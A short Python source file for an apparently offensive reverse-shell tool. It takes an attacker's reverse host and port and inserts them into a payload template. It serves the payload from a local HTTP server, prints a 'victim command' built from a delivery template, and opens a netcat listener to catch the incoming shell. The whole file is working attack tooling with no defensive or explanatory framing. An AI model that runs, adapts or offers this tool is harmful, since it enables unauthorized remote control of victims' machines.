import socket, os, threading
from http.server import BaseHTTPRequestHandler, HTTPServer

class Log:
    def info(self, msg):
        print("[*] " + msg)

    def error(self, msg):
        print("[!] " + msg)

    def verbose(self, msg):
        print("[!] " + msg)

    def success(self, msg):
        print("[+] " + msg)

    def inpt(self, msg):
        return input("[>] " + msg)

class RevServer:
    def __init__(self, port):
        self.port = port

    def start(self):
        os.system("nc -lnvp " + str(self.port))


def create_handler(payload):
    class PayServer(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(payload)
    return PayServer

class Main:
    def __init__(self):
        self.log = Log()
        self.rev_host = self.log.inpt("Reverse host: ")
        self.rev_port = self.log.inpt("Reverse port: ")
        self.rev_server = RevServer(self.rev_port)

    def load_payload(self, file):
        with open(f"Assets/Payloads/{file + '.txt'}", "r") as f:
            return f.read().replace("_IP_", self.rev_host).replace("_PORT_", f"{self.rev_port}").encode("utf-8")

    def load_delivery(self, file):
        with open(f"Assets/Deliveries/{file + '.txt'}", "r") as f:
            return f.read().replace("URL", "http://127.0.0.1:8000")

    def show_loads(self):
        self.log.verbose("Available payloads")
        for file in os.listdir("Assets/Payloads"):
            self.log.info(file.split(".")[0])

    def show_deliveries(self):
        self.log.verbose("Available deliveries")
        for file in os.listdir("Assets/Deliveries"):
            self.log.info(file.split(".")[0])

    def start_server(self, load):
        load = self.load_payload(load)
        self.log.info("Sellected payload: " + load.decode("utf-8"))
        handler = create_handler(load)
        with HTTPServer(("127.0.0.1", 8000), handler) as httpd:
            httpd.serve_forever()

    def main(self):
        self.show_loads()
        payload = self.log.inpt("Payload: ")
        self.show_deliveries()
        delivery = self.log.inpt("Delivery: ")
        threading.Thread(target=self.start_server, args=(payload,)).start()
        self.log.info("Victim command: " + self.load_delivery(delivery))
        self.rev_server.start()
        input()

if __name__ == "__main__":
    main = Main()
    main.main()